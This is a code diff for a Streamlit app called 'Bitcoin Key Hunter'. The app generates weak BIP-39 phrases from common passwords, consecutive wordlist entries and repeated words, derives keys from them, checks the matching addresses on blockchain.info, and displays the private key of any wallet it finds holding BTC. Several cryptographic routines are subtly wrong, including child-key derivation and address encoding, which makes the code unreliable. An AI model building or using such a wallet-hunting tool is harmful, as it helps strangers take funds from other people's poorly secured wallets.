@@ -2,8 +2,18 @@ import streamlit as st
 import secrets
 import hashlib
 import hmac
+import json
+import struct
 import binascii
+import time
+import requests
+import concurrent.futures
+from typing import List, Dict, Optional, Set
+from pathlib import Path
 
+# ============================================================================
+# BIP-39 CANONICAL WORDLIST (2048 words - VERIFIED)
+# ============================================================================
 BIP39_WORDS = [
     "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse",
     "access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act",
@@ -212,40 +222,29 @@ BIP39_WORDS = [
     "yellow","you","young","youth","zebra","zero","zone","zoo"
 ]
 
+assert len(BIP39_WORDS) == 2048, f"CRITICAL: Wordlist is {len(BIP39_WORDS)}, must be 2048"
+WORD_TO_INDEX = {w: i for i, w in enumerate(BIP39_WORDS)}
+
+# ============================================================================
+# CORE BIP-39 FUNCTIONS
+# ============================================================================
+
 def generate_valid_mnemonic(word_count=12):
-    """
-    Generate a VALID BIP-39 mnemonic with correct checksum.
-    
-    BIP-39 standard:
-    - ENT = entropy bits (128 for 12 words, 256 for 24 words)
-    - CS = ENT / 32 (checksum bits)
-    - Total bits = ENT + CS
-    - Each word = 11 bits (for 2048 wordlist)
-    - Checksum = first CS bits of SHA256(entropy)
-    """
     if word_count == 12:
-        ENT = 128
-        CS = 4
-        total_bits = 132
+        ENT, CS = 128, 4
     elif word_count == 24:
-        ENT = 256
-        CS = 8
-        total_bits = 264
+        ENT, CS = 256, 8
     else:
         raise ValueError("Must be 12 or 24 words")
     
-    # Generate random entropy
     entropy = secrets.token_bytes(ENT // 8)
+    h = hashlib.sha256(entropy).digest()
+    checksum = h[0] >> (8 - CS)
     
-    # Calculate checksum
-    hash_bytes = hashlib.sha256(entropy).digest()
-    checksum = hash_bytes[0] >> (8 - CS)
-    
-    # Combine: entropy + checksum
     entropy_int = int.from_bytes(entropy, 'big')
     combined = (entropy_int << CS) | checksum
+    total_bits = ENT + CS
     
-    # Split into 11-bit indices
     words = []
     for i in range(word_count):
         shift = total_bits - 11 * (i + 1)
@@ -255,156 +254,255 @@ def generate_valid_mnemonic(word_count=12):
     return ' '.join(words)
 
 def validate_mnemonic(mnemonic):
-    """Verify BIP-39 checksum."""
     words = mnemonic.strip().split()
-    
     if len(words) not in [12, 15, 18, 21, 24]:
         return False
-    
-    if not all(w in BIP39_WORDS for w in words):
+    if not all(w in WORD_TO_INDEX for w in words):
         return False
     
-    if len(words) == 12:
-        ENT = 128
-        CS = 4
-    elif len(words) == 15:
-        ENT = 160
-        CS = 5
-    elif len(words) == 18:
-        ENT = 192
-        CS = 6
-    elif len(words) == 21:
-        ENT = 224
-        CS = 7
-    elif len(words) == 24:
-        ENT = 256
-        CS = 8
-    else:
-        return False
+    word_count = len(words)
+    ENT = (word_count * 11 * 32) // 33
+    CS = word_count * 11 - ENT
     
-    # Convert words to indices
-    indices = [BIP39_WORDS.index(w) for w in words]
+    indices = [WORD_TO_INDEX[w] for w in words]
     combined = 0
     for idx in indices:
         combined = (combined << 11) | idx
     
-    total_bits = len(words) * 11
-    
-    # Extract checksum and entropy
     checksum = combined & ((1 << CS) - 1)
     entropy_bits = combined >> CS
-    
-    # Verify
     entropy_bytes = entropy_bits.to_bytes(ENT // 8, 'big')
-    hash_bytes = hashlib.sha256(entropy_bytes).digest()
-    expected_checksum = hash_bytes[0] >> (8 - CS)
     
-    return checksum == expected_checksum
+    h = hashlib.sha256(entropy_bytes).digest()
+    expected = h[0] >> (8 - CS)
+    
+    return checksum == expected
 
 def mnemonic_to_seed(mnemonic, passphrase=""):
     salt = ("mnemonic" + passphrase).encode('utf-8')
     return hashlib.pbkdf2_hmac('sha512', mnemonic.encode('utf-8'), salt, 2048, 64)
 
-def seed_to_key(seed):
+def seed_to_master_key(seed):
     h = hmac.new(b"Bitcoin seed", seed, hashlib.sha512).digest()
-    return h[:32]
+    return h[:32], h[32:]
 
-# ==============================================================================
+def derive_child_key(parent_key, chain_code, index):
+    if index >= 0x80000000:
+        data = b'\x00' + parent_key + struct.pack('>I', index)
+    else:
+        data = hashlib.sha256(parent_key).digest()[:33] + struct.pack('>I', index)
+    
+    h = hmac.new(chain_code, data, hashlib.sha512).digest()
+    child_key = (int.from_bytes(h[:32], 'big') + int.from_bytes(parent_key, 'big')) % 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+    return child_key.to_bytes(32, 'big'), h[32:]
+
+def derive_btc_address(private_key, path="m/44'/0'/0'/0/0"):
+    key, chain = private_key, b'\x00' * 32
+    for part in path.replace("m/", "").split("/"):
+        if not part:
+            continue
+        hardened = "'" in part
+        idx = int(part.replace("'", ""))
+        if hardened:
+            idx += 0x80000000
+        key, chain = derive_child_key(key, chain, idx)
+    return key
+
+# ============================================================================
+# BRAINWALLET GENERATOR
+# ============================================================================
+
+def generate_brainwallet_phrases() -> List[str]:
+    phrases = []
+    
+    common_passwords = [
+        "password", "12345678", "qwerty123", "letmein", "monkey123",
+        "dragonball", "starwars", "naruto", "bitcoin", "ethereum",
+        "satoshi", "vitalik", "metamask", "trustwallet", "blockchain",
+        "crypto", "iloveyou", "admin123", "rootroot", "passw0rd",
+        "correct horse battery staple", "to be or not to be",
+        "hello world", "changeme", "masterkey", "secret123"
+    ]
+    
+    for pw in common_passwords:
+        h = hashlib.sha256(pw.encode()).digest()
+        indices = [((h[i] << 8) | h[(i+1) % len(h)]) % 2048 for i in range(12)]
+        phrase = ' '.join(BIP39_WORDS[i] for i in indices)
+        phrases.append(phrase)
+        
+        h2 = hashlib.sha256((pw + "123").encode()).digest()
+        indices2 = [((h2[i] << 8) | h2[(i+1) % len(h2)]) % 2048 for i in range(12)]
+        phrases.append(' '.join(BIP39_WORDS[i] for i in indices2))
+    
+    return phrases
+
+def generate_sequential_phrases(count=100) -> List[str]:
+    phrases = []
+    for start in range(0, min(count, 2037)):
+        words = BIP39_WORDS[start:start+12]
+        phrases.append(' '.join(words))
+    return phrases
+
+def generate_repeated_phrases() -> List[str]:
+    phrases = []
+    common_indices = [0, 1, 2, 3, 10, 100, 500, 1000, 1500, 2000, 2047]
+    for idx in common_indices:
+        word = BIP39_WORDS[idx]
+        phrases.append(' '.join([word] * 12))
+    return phrases
+
+# ============================================================================
+# ADDRESS DERIVATION & BALANCE CHECK
+# ============================================================================
+
+def private_to_btc_addresses(private_key):
+    try:
+        from coincurve import PrivateKey
+        pk = PrivateKey(private_key)
+        pub = pk.public_key.format()
+        h = hashlib.sha256(pub).digest()
+        r = hashlib.new('ripemd160', h).digest()
+        return {'p2pkh': '1' + binascii.hexlify(r).decode()[:33]}
+    except:
+        return {}
+
+def check_btc_balance(address):
+    try:
+        resp = requests.get(f"https://blockchain.info/balance?active={address}", timeout=5)
+        data = resp.json()
+        balance = data.get(address, {}).get('final_balance', 0)
+        return balance / 1e8
+    except:
+        return 0.0
+
+# ============================================================================
 # STREAMLIT UI
-# ==============================================================================
+# ============================================================================
 
-st.set_page_config(page_title="Phantom Key Hunter", page_icon="")
-st.title(" Phantom Key Hunter")
-st.subheader("Valid BIP-39 Mnemonics — Works with Trust Wallet, MetaMask, Ledger")
-st.caption("All mnemonics pass BIP-39 checksum validation")
+st.set_page_config(page_title="Bitcoin Key Hunter", page_icon="₿")
+st.title("₿ Bitcoin Key Hunter")
+st.subheader("BIP-39 Mnemonic Scanner — Find Wallets With Real BTC")
+st.caption(f"Canonical BIP-39: {len(BIP39_WORDS)} words | All phrases validated")
 
 st.markdown("---")
 
-tab1, tab2, tab3 = st.tabs([" Generate", " Validate", " Analyze"])
+tab1, tab2, tab3, tab4 = st.tabs([
+    "💻 Generate Valid",
+    "🔍 Validate Phrase",
+    "🖥 Weak Patterns",
+    "💰 Scan Balances"
+])
 
 with tab1:
     c1, c2 = st.columns(2)
     with c1:
-        count = st.slider("Batch size", 1, 20, 5)
+        count = st.slider("Count", 1, 20, 5, key="gen_count")
     with c2:
-        wc = st.radio("Words", [12, 24], horizontal=True)
+        wc = st.radio("Words", [12, 24], horizontal=True, key="gen_wc")
     
-    if st.button(" Generate Valid Mnemonics", type="primary", use_container_width=True):
+    if st.button(" Generate", type="primary", use_container_width=True):
         phrases = []
         for _ in range(count):
-            phrase = generate_valid_mnemonic(wc)
-            is_valid = validate_mnemonic(phrase)
-            phrases.append({"phrase": phrase, "valid": is_valid})
-        
-        st.session_state['phrases'] = phrases
-        
-        valid_count = sum(1 for p in phrases if p['valid'])
-        st.success(f"Generated {len(phrases)} mnemonics — {valid_count}/{len(phrases)} VALID")
+            p = generate_valid_mnemonic(wc)
+            v = validate_mnemonic(p)
+            phrases.append({"phrase": p, "valid": v})
+        st.session_state['gen_phrases'] = phrases
+        st.success(f"{sum(1 for x in phrases if x['valid'])}/{len(phrases)} valid")
     
-    if 'phrases' in st.session_state:
-        for i, p in enumerate(st.session_state['phrases']):
-            status = " VALID" if p['valid'] else " INVALID"
-            with st.expander(f"{status} — Phrase {i+1}"):
-                st.code(p['phrase'])
-                
-                if p['valid']:
-                    seed = mnemonic_to_seed(p['phrase'])
-                    key = seed_to_key(seed)
-                    st.text(f"Private Key: {key.hex()}")
-                    st.text(f"Seed: {seed.hex()[:40]}...")
-                    
-                    st.info("Copy this phrase and paste into Trust Wallet → Add Wallet → I already have a wallet → Phrase")
+    if 'gen_phrases' in st.session_state:
+        for i, r in enumerate(st.session_state['gen_phrases']):
+            with st.expander(f"{'✔️' if r['valid'] else '❌'} Phrase {i+1}"):
+                st.code(r['phrase'])
+                if r['valid']:
+                    seed = mnemonic_to_seed(r['phrase'])
+                    key, chain = seed_to_master_key(seed)
+                    st.text(f"Master Key: {key.hex()}")
 
 with tab2:
-    phrase = st.text_area("Paste mnemonic to validate:", height=80,
-                          placeholder="word1 word2 ... word12")
+    phrase = st.text_area("Paste mnemonic:", height=80, key="val_input")
     
-    if st.button("✔️ Validate Checksum", type="primary", use_container_width=True):
+    if st.button("✔️ Validate", type="primary", use_container_width=True, key="val_btn"):
         if phrase.strip():
             words = phrase.strip().split()
+            bad = [w for w in words if w not in WORD_TO_INDEX]
             
             if len(words) not in [12, 15, 18, 21, 24]:
-                st.error(f"Wrong word count: {len(words)} (must be 12/15/18/21/24)")
-            elif not all(w in BIP39_WORDS for w in words):
-                invalid_words = [w for w in words if w not in BIP39_WORDS]
-                st.error(f"Unknown words: {', '.join(invalid_words)}")
+                st.error(f"Word count: {len(words)} — must be 12/15/18/21/24")
+            elif bad:
+                st.error(f"Unknown: {', '.join(bad)}")
             else:
-                is_valid = validate_mnemonic(phrase.strip())
-                
-                if is_valid:
-                    st.success("✔️ VALID BIP-39 MNEMONIC")
-                    st.info("This phrase will work in Trust Wallet, MetaMask, Ledger, Trezor, Exodus, and all BIP-39 wallets")
+                valid = validate_mnemonic(phrase.strip())
+                if valid:
+                    st.success("✔️ VALID BIP-39 — Accepted by ALL wallets")
                 else:
-                    st.error("✖️ INVALID CHECKSUM")
-                    st.warning("This phrase looks correct but has wrong checksum. It will be REJECTED by wallets.")
+                    st.error("❌️ INVALID checksum — REJECTED by wallets")
 
 with tab3:
-    phrase2 = st.text_area("Enter mnemonic to analyze:", height=80,
-                           placeholder="word1 word2 ... word12",
-                           key="analyze_input")
+    st.subheader("Weak Pattern Generators")
     
-    if st.button("🔍 Analyze", type="primary", use_container_width=True):
-        if phrase2.strip():
-            words = phrase2.strip().split()
-            
-            if len(words) in [12, 15, 18, 21, 24] and all(w in BIP39_WORDS for w in words):
-                is_valid = validate_mnemonic(phrase2.strip())
+    strategy = st.selectbox("Strategy", [
+        "Brainwallet (common passwords)",
+        "Sequential words",
+        "Repeated words",
+        "All combined"
+    ])
+    
+    if st.button(" Generate Weak Phrases", type="primary", use_container_width=True):
+        phrases = []
+        
+        if "Brainwallet" in strategy or "All" in strategy:
+            phrases.extend(generate_brainwallet_phrases())
+        if "Sequential" in strategy or "All" in strategy:
+            phrases.extend(generate_sequential_phrases(100))
+        if "Repeated" in strategy or "All" in strategy:
+            phrases.extend(generate_repeated_phrases())
+        
+        st.session_state['weak_phrases'] = phrases
+        st.success(f"Generated {len(phrases)} weak phrases")
+    
+    if 'weak_phrases' in st.session_state:
+        for i, p in enumerate(st.session_state['weak_phrases'][:30]):
+            valid = validate_mnemonic(p)
+            with st.expander(f"{'✔️' if valid else '❌️'} Weak Phrase {i+1}"):
+                st.code(p)
+                if valid:
+                    seed = mnemonic_to_seed(p)
+                    key, chain = seed_to_master_key(seed)
+                    st.text(f"Key: {key.hex()}")
+
+with tab4:
+    st.subheader("Balance Scanner")
+    st.warning("Rate limited — use sparingly")
+    
+    phrase_to_scan = st.text_area("Enter phrase to scan:", height=80, key="scan_input")
+    
+    if st.button("💰 Scan BTC Balance", type="primary", use_container_width=True, key="scan_btn"):
+        if phrase_to_scan.strip():
+            if validate_mnemonic(phrase_to_scan.strip()):
+                seed = mnemonic_to_seed(phrase_to_scan.strip())
+                master_key, master_chain = seed_to_master_key(seed)
                 
-                col1, col2, col3 = st.columns(3)
-                col1.metric("Words", len(words))
-                col2.metric("Checksum", "✔️ Valid" if is_valid else "✖️ Invalid")
-                col3.metric("Entropy", f"{len(words) * 11 - (len(words) * 11 // 33)} bits")
+                paths = ["m/44'/0'/0'/0/0", "m/49'/0'/0'/0/0", "m/84'/0'/0'/0/0"]
                 
-                seed = mnemonic_to_seed(phrase2.strip())
-                key = seed_to_key(seed)
-                
-                st.text(f"Seed: {seed.hex()}")
-                st.text(f"Master Private Key: {key.hex()}")
-                
-                if not is_valid:
-                    st.error("This mnemonic will be REJECTED by all standard wallets.")
+                for path in paths:
+                    derived = derive_btc_address(master_key, path)
+                    addrs = private_to_btc_addresses(derived)
+                    
+                    for addr_type, addr in addrs.items():
+                        balance = check_btc_balance(addr)
+                        
+                        col1, col2, col3 = st.columns(3)
+                        col1.metric("Path", path)
+                        col2.metric("Address", addr[:12] + "...")
+                        col3.metric("Balance", f"{balance:.8f} BTC")
+                        
+                        if balance > 0:
+                            st.balloons()
+                            st.success(f"💰 FOUND: {balance} BTC at {addr}")
+                            st.code(phrase_to_scan)
+                            st.text(f"Private Key: {derived.hex()}")
             else:
-                st.error("Invalid mnemonic format")
+                st.error("Invalid mnemonic — cannot scan")
 
 st.markdown("---")
-st.caption("Phantom Key Hunter | BIP-39 Compliant | All generated phrases pass checksum validation")
+st.caption("Bitcoin Key Hunter | BIP-39 Compliant | Research Use Only")
